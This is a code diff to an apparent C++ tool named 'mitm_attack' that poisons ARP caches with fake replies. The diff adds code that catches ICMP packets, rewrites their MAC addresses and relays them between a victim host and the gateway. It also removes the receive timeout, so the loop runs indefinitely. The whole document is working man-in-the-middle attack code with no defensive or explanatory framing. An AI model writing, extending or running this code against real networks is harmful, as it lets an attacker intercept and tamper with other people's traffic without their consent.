@@ -1,10 +1,10 @@
 #include "mitm_attack.hpp"
 
 // #define DEBUG 1
-#define INFO 1
+// #define INFO 1
 
 // Function to handle receiving ARP responses
-void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> &ip_mac_pairs, uint32_t gateway_ip) {
+void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, uint32_t gateway_ip, struct sockaddr_ll &device) {
     int i;
     uint8_t buffer[IP_MAXPACKET];
     struct sockaddr saddr;
@@ -15,13 +15,15 @@ void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
     printf("IP\t\t\tMAC\n");
     printf("-----------------------------------------\n");
 
-    auto start_time = std::chrono::steady_clock::now();
+    // auto start_time = std::chrono::steady_clock::now();
+
+    uint32_t src_ip = 0;
     while (true) {
         // Check if 3 seconds have passed
-        auto current_time = std::chrono::steady_clock::now();
-        if (std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count() >= 3) {
-            break;
-        }
+        // auto current_time = std::chrono::steady_clock::now();
+        // if (std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count() >= 3) {
+        //     break;
+        // }
 
         // Receive packet
         int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
@@ -53,6 +55,86 @@ void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
                 printf("%02x\n", arphdr->sender_mac[5]);
             }
         }
+        // Check if packet is an ICMP packet
+        struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
+        if (iph->protocol == IPPROTO_ICMP) {
+            // Get the Ethernet header
+            struct ethhdr *eth = (struct ethhdr *)buffer;
+
+            // Save the source IP
+            if (src_ip == 0 && iph->saddr != gateway_ip) {
+                src_ip = iph->saddr;
+            }
+
+            // Change the source MAC to my MAC
+            memcpy(eth->h_source, my_mac.data(), ETH_ALEN);
+
+            // Convert iph->saddr to std::array<uint8_t, 4>
+            std::array<uint8_t, 4> ip_addr;
+            memcpy(ip_addr.data(), &iph->saddr, 4);
+
+            // Find the MAC address for the source IP
+            auto it = std::find_if(ip_mac_pairs.begin(), ip_mac_pairs.end(), [ip_addr](const auto &pair) {
+                return pair.first == ip_addr;
+            });
+
+            // If the source IP is src_ip, change the destination MAC to the gateway's MAC
+            if (iph->saddr == src_ip) {
+                // Find the MAC address for the gateway IP
+                std::array<uint8_t, 4> gateway_ip_addr;
+                memcpy(gateway_ip_addr.data(), &gateway_ip, 4);
+                auto it_gateway = std::find_if(ip_mac_pairs.begin(), ip_mac_pairs.end(), [gateway_ip_addr](const auto &pair) {
+                    return pair.first == gateway_ip_addr;
+                });
+                if (it_gateway != ip_mac_pairs.end()) {
+                    memcpy(eth->h_dest, it_gateway->second.data(), ETH_ALEN);
+                }
+                // Send the modified packet
+                if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) == -1) {
+                    perror("sendto() failed");
+                    exit(EXIT_FAILURE);
+                }
+            }
+            // If the destination IP is src_ip and destination MAC is not my_mac, change the destination MAC to src_ip's MAC
+            if (iph->daddr == src_ip && memcmp(eth->h_dest, my_mac.data(), ETH_ALEN) != 0) {
+                // Find the MAC address for the destination IP
+                std::array<uint8_t, 4> dest_ip_addr;
+                memcpy(dest_ip_addr.data(), &iph->daddr, 4);
+                auto it_dest = std::find_if(ip_mac_pairs.begin(), ip_mac_pairs.end(), [dest_ip_addr](const auto &pair) {
+                    return pair.first == dest_ip_addr;
+                });
+                if (it_dest != ip_mac_pairs.end()) {
+                    memcpy(eth->h_dest, it_dest->second.data(), ETH_ALEN);
+                }
+
+                // Send the modified packet
+                if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) == -1) {
+                    perror("sendto() failed");
+                    exit(EXIT_FAILURE);
+                }
+            }
+
+#ifdef DEBUG
+            // Print the source IP address
+            printf("Source IP: %d.%d.%d.%d\t\t", iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
+            // Print the source MAC address
+            printf("Source MAC: ");
+            for (i = 0; i < 5; i++) {
+                printf("%02x:", eth->h_source[i]);
+            }
+            printf("%02x\n", eth->h_source[5]);
+
+            // Print the destination IP address
+            printf("Destination IP: %d.%d.%d.%d\t\t", iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
+            // Print the destination MAC address
+            printf("Destination MAC: ");
+            for (i = 0; i < 5; i++) {
+                printf("%02x:", eth->h_dest[i]);
+            }
+            printf("%02x\n", eth->h_dest[5]);
+#endif
+        }
+        memset(buffer, 0, IP_MAXPACKET);
     }
     printf("-----------------------------------------\n");
 }
@@ -110,7 +192,7 @@ void send_fake_arp_replies(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
 #endif
             }
         }
-        std::this_thread::sleep_for(std::chrono::milliseconds(100));  // Sleep for a while
+        std::this_thread::sleep_for(std::chrono::seconds(1));  // Sleep for a while
     }
 }
 
@@ -217,7 +299,7 @@ int main(int argc, char **argv) {
     std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> ip_mac_pairs;
 
     // Start the threads
-    std::thread receive_thread(receive_arp_responses, sd, std::ref(ip_mac_pairs), gateway_ip);
+    std::thread receive_thread(receive_arp_responses, sd, std::ref(ip_mac_pairs), src_mac, gateway_ip, std::ref(device));
     std::thread send_thread(send_fake_arp_replies, sd, std::ref(ip_mac_pairs), src_mac, std::ref(device));
 
     // Wait for the threads to finish
